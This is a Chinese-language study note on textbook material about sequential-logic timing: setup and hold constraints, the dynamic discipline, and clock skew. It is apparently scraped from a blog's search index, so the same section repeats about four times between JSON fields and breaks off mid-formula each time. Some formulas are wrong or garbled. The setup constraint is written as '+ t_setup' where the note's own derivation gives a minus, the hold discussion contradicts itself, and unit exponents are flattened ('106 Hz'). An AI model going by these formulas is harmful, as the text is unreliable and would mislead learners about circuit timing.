Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#put-it-all-together"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#354-metastability"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#metastable-state"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#resolution-time"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System 